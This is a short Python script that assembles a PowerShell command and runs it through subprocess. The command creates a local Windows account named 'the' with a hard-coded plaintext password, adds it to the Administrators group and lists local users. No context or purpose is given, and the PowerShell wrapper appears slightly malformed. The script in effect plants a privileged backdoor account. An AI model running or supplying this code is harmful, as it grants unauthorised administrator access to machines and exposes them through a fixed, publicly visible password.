command = """
$nusnm = """ + '"{}"'.format("the") + """
$nuspss = ConvertTo-SecureString """ + '"{}"'.format("webiwabo") + """ -AsPlainText -Force
New-LocalUser -Name $nusnm -Password $nuspss
Add-LocalGroupMember -Group "Administrators" -Member $nusnm
Get-LocalUser
"""

print(command)
import subprocess
exec = subprocess.Popen(["powershell","& { +" + command + "}"])